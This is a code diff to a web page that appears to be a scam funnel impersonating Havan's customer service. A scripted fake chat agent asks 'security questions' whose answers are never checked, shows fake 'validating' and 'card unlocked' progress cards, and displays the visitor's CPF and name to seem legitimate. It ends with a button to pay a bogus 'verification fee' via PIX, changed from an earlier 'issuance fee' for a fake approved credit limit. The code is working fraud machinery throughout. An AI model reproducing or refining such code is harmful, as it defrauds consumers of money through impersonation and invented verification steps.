@@ -60,6 +60,28 @@
         @keyframes spin { to { transform: rotate(360deg); } }
 
         .footer { text-align:center; padding: 20px 16px; font-size:.75rem; color:#666; }
+        .msg.user { background:#0a2fd6; border-radius:6px; }
+        .opts { display:flex; flex-direction:column; align-items:flex-end; gap:8px; }
+        .opts.grid { display:grid; grid-template-columns:1fr 1fr; }
+        .opt-btn { background:#0a2fd6; color:#fff; border:none; border-radius:6px; padding:11px 16px; font-weight:700; font-size:14px; cursor:pointer; }
+        .opt-btn:hover { background:#0822a8; }
+        .msg.card { padding:8px; width:82%; }
+        .status-card { background:linear-gradient(135deg,#f3f4f6,#e5e7eb); border-radius:8px; padding:22px 16px; text-align:center; }
+        .status-card .spin { width:46px; height:46px; margin:0 auto 10px; border:4px solid #e5e7eb; border-top-color:#f4b400; border-right-color:#0a2fd6; border-radius:50%; animation:spin .9s linear infinite; }
+        .status-card .check { width:56px; height:56px; margin:0 auto 10px; background:#1a8a2e; color:#fff; border-radius:50%; font-size:30px; line-height:56px; font-weight:700; animation:pop .35s ease; }
+        .status-card .st-txt { color:#0a2fd6; font-weight:700; font-size:15px; }
+        .status-card.done .st-txt { color:#1a8a2e; }
+        .status-card .bar { height:4px; background:#d1d5db; border-radius:4px; margin-top:14px; overflow:hidden; }
+        .status-card .bar i { display:block; height:100%; width:0; background:linear-gradient(90deg,#0a2fd6,#f4b400); animation:fill 2.6s linear forwards; }
+        .status-card .bar.full i { width:100%; background:#1a8a2e; animation:none; }
+        @keyframes fill { to { width:100%; } }
+        @keyframes pop { from { transform:scale(.3); opacity:0 } to { transform:scale(1); opacity:1 } }
+        .titular { background:linear-gradient(135deg,#0a2fd6,#071f9e); color:#fff; border-radius:10px; padding:12px 14px; }
+        .tt-h { font-size:11px; letter-spacing:1.5px; opacity:.85; padding-bottom:8px; border-bottom:1px solid rgba(255,255,255,.2); }
+        .tt-r { padding:8px 0; border-bottom:1px solid rgba(255,255,255,.12); }
+        .tt-r:last-child { border-bottom:none; }
+        .tt-r small { display:block; font-size:9px; letter-spacing:1px; opacity:.7; }
+        .tt-r b { font-family:monospace; font-size:14px; letter-spacing:.5px; }
         @media (max-width: 768px) { .chat-container { margin: 10px; height: 82vh; border-radius: 8px; } }
     </style>
 <!-- Meta Pixel Code -->
@@ -441,28 +463,55 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
     function getDados() {
         let dc = {};
         try { dc = JSON.parse(localStorage.getItem('dadosCPF') || '{}') || {}; } catch(_) {}
-        const nome = (urlParams.get('nome') || dc.nomeCompleto || '').trim();
-        const nasc = (urlParams.get('nascimento') || dc.nascimento || '').trim();
-        return { nome, primeiro: nome ? nome.split(/\s+/)[0].toLowerCase().replace(/^./, c => c.toUpperCase()) : '', nasc };
+        const ok = v => v && !/não (encontrad|informad)/i.test(v);
+        const nome = ok(urlParams.get('nome') || dc.nomeCompleto) ? (urlParams.get('nome') || dc.nomeCompleto).trim() : '';
+        const nasc = ok(urlParams.get('nascimento') || dc.nascimento) ? (urlParams.get('nascimento') || dc.nascimento).trim() : '';
+        const mae = ((urlParams.get('mae') || dc.mae || '') + '').trim();
+        const cpfRaw = (urlParams.get('cpf') || dc.cpf || '').replace(/\D/g, '');
+        const cpf = dc.cpfFormatado || (cpfRaw.length === 11 ? cpfRaw.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : cpfRaw);
+        return { nome, nasc, mae, cpf };
     }
+    const tc = s => s.toLowerCase().replace(/(^|\s)\S/g, c => c.toUpperCase());
     async function say(text, ms=900) {
         showTyping(); await wait(ms); hideTyping();
         const s = document.createElement('div'); s.innerHTML = text; addAgentMessage(s);
     }
     async function sayAudio(file) {
-        showTyping(); await wait(1400); hideTyping();
-        renderBubble({ type: 'audio', content: { url: '/funil/12/audios/' + file } });
-        await wait(1200);
+        showTyping(); await wait(1200); hideTyping();
+        const a = document.createElement('audio');
+        a.src = '/funil/12/audios/' + file; a.controls = true; a.preload = 'auto';
+        addAgentMessage(a, 'audio');
+        await new Promise(res => {
+            let done = false; const fin = () => { if (!done) { done = true; res(); } };
+            a.addEventListener('ended', fin);
+            a.addEventListener('error', fin);
+            a.play().catch(() => setTimeout(fin, 2500)); // se o navegador bloquear o autoplay, segue o fluxo
+        });
+        await wait(500);
     }
-    function ask(options) {
+    async function card(html, ms) {
+        const el = document.createElement('div');
+        el.className = 'status-card';
+        el.innerHTML = '<div class="spin"></div><div class="st-txt">' + html.loading + '</div><div class="bar"><i></i></div>';
+        addAgentMessage(el, 'card');
+        await wait(ms);
+        el.classList.add('done');
+        el.innerHTML = '<div class="check">✓</div><div class="st-txt">' + html.done + '</div><div class="bar full"><i></i></div>';
+        scroll();
+        await wait(800);
+    }
+    function ask(options, cls='') {
         return new Promise(res => {
             clearActions();
+            const wrap = document.createElement('div');
+            wrap.className = 'opts ' + cls;
             options.forEach(label => {
                 const b = document.createElement('button');
-                b.className = 'choice-btn'; b.textContent = label;
+                b.className = 'opt-btn'; b.textContent = label;
                 b.onclick = () => { clearActions(); addUserMessage(label); res(label); };
-                actionsEl.appendChild(b);
+                wrap.appendChild(b);
             });
+            actionsEl.appendChild(wrap);
             scroll();
         });
     }
@@ -470,36 +519,55 @@ src="https://www.facebook.com/tr?id=1062555759088296&ev=PageView&noscript=1"/></
         const m = /^(\d{2})\/(\d{2})\/(\d{4})$/.exec(real);
         const y = m ? +m[3] : 1985;
         const pad = n => String(n).padStart(2, '0');
-        const out = new Set([real]);
-        while (out.size < 3) out.add(pad(1 + Math.floor(Math.random()*28)) + '/' + pad(1 + Math.floor(Math.random()*12)) + '/' + (y + Math.floor(Math.random()*7) - 3));
+        const out = new Set(real ? [real] : []);
+        while (out.size < 4) out.add(pad(1 + Math.floor(Math.random()*28)) + '/' + pad(1 + Math.floor(Math.random()*12)) + '/' + (y + Math.floor(Math.random()*21) - 10));
         return [...out].sort(() => Math.random() - 0.5);
     }
+    const FAKE_NAMES = ['Roberta Oliveira Costa','Tereza Tomaz das Neves','Fernanda Cunha Ferreira','Maria Aparecida Souza','Sandra Regina Lima','Lúcia Helena Martins'];
     async function runScript() {
         const d = getDados();
+        await say('Olá! seja bem vindo(a) a central de atendimento da Havan! me chamo <strong>Julia Silva</strong> e vou te auxiliar a <strong>desbloquear seu cartão.</strong>', 1000);
         await sayAudio('a1.mp3');
-        await say(`Olá${d.primeiro ? ', <strong>' + d.primeiro + '</strong>' : ''}! 👋 Sou a <strong>Juliana</strong>, da Central de Atendimento Havan.`);
-        await say('Vou te ajudar a finalizar a liberação do seu <strong>Cartão Havan</strong>. Podemos continuar?');
-        await ask(['Sim, vamos continuar']);
-        await say('Ótimo! Por segurança, preciso confirmar sua identidade. 🔒');
-        if (d.nasc) {
-            await say('Qual é a sua <strong>data de nascimento</strong>?');
-            let ok = false;
-            for (let t = 0; t < 2 && !ok; t++) {
-                const r = await ask([...fakeDates(d.nasc), 'Nenhuma data acima']);
-                ok = r === d.nasc;
-                if (!ok && t === 0) await say('Hmm, essa data não confere com o nosso cadastro. Vamos tentar de novo:');
-            }
-            if (!ok) await say('Tudo bem, vou validar seu cadastro pelo CPF. ✅');
-        }
-        showTyping(); await wait(1800); hideTyping();
-        await say('✅ <strong>Identidade confirmada!</strong>');
+        await say('<strong>ATENÇÃO ❗</strong> Responda as perguntas abaixo corretamente para podermos continuar.');
+
+        await say('<strong>Pergunta de segurança 1:</strong>', 700);
+        const fakes = FAKE_NAMES.sort(() => Math.random() - 0.5).slice(0, 3);
+        const names = (d.mae ? [...fakes, tc(d.mae)] : [...fakes, FAKE_NAMES[3]]).sort(() => Math.random() - 0.5);
+        await ask([...names, 'Nenhum dos nomes acima']);
+
+        await say('<strong>Pergunta de segurança 2:</strong>', 700);
+        await ask(fakeDates(d.nasc), 'grid');
+
+        await say('<strong>Pergunta de segurança 3:</strong>', 700);
+        await ask(['Solteiro(a)','Casado(a)','Viuvo(a)','Separado(a) judicialmente','Em relação estável']);
+
+        await card({ loading: 'Validando dados...', done: 'Dados validados com sucesso!' }, 2600);
         await sayAudio('a2.mp3');
-        await say('Seu limite de <strong>R$ 4.700,00</strong> está <strong>aprovado</strong>! 🎉');
-        await say('Para emitir e enviar o cartão, falta apenas a <strong>Taxa de Emissão de R$ 28,72</strong>, paga via PIX.');
-        await say('Assim que o pagamento é confirmado, seu cartão segue para emissão e chega em até <strong>3 dias úteis</strong>. 📦');
+
+        await say('Confira se os dados abaixo estão corretos:', 800);
+        const t = document.createElement('div');
+        t.className = 'titular';
+        t.innerHTML = '<div class="tt-h">🏛️ <span>DADOS DO TITULAR</span></div>'
+            + '<div class="tt-r"><small>NOME COMPLETO</small><b></b></div>'
+            + '<div class="tt-r"><small>CPF</small><b></b></div>'
+            + '<div class="tt-r"><small>DATA DE NASCIMENTO</small><b></b></div>';
+        const bs = t.querySelectorAll('b');
+        bs[0].textContent = (d.nome || '—').toUpperCase();
+        bs[1].textContent = d.cpf || '—';
+        bs[2].textContent = d.nasc || '—';
+        addAgentMessage(t, 'card');
+        await ask(['Sim, estão.', 'Não estão corretos, preciso alterar.']);
+
         await sayAudio('a3.mp3');
-        await say('É só tocar no botão abaixo para gerar o PIX. 👇');
-        showPayButton('PAGAR TAXA DE EMISSÃO');
+        await say('Posso realizar o desbloqueio do seu cartão?');
+        await ask(['Sim, pode realizar o desbloqueio.', 'Não, desejo desistir do meu cartão.']);
+
+        await card({ loading: 'Desbloqueando cartão......', done: 'Cartão desbloqueado com sucesso!' }, 3200);
+        await sayAudio('a4.mp3');
+        await sayAudio('a5.mp3');
+        await ask(['Por que preciso pagar a taxa de verificação?']);
+        await sayAudio('a6.mp3');
+        showPayButton('PAGAR TAXA DE VERIFICAÇÃO');
     }
     runScript().catch(e => { console.error(e); showPayButton(); });
 })();
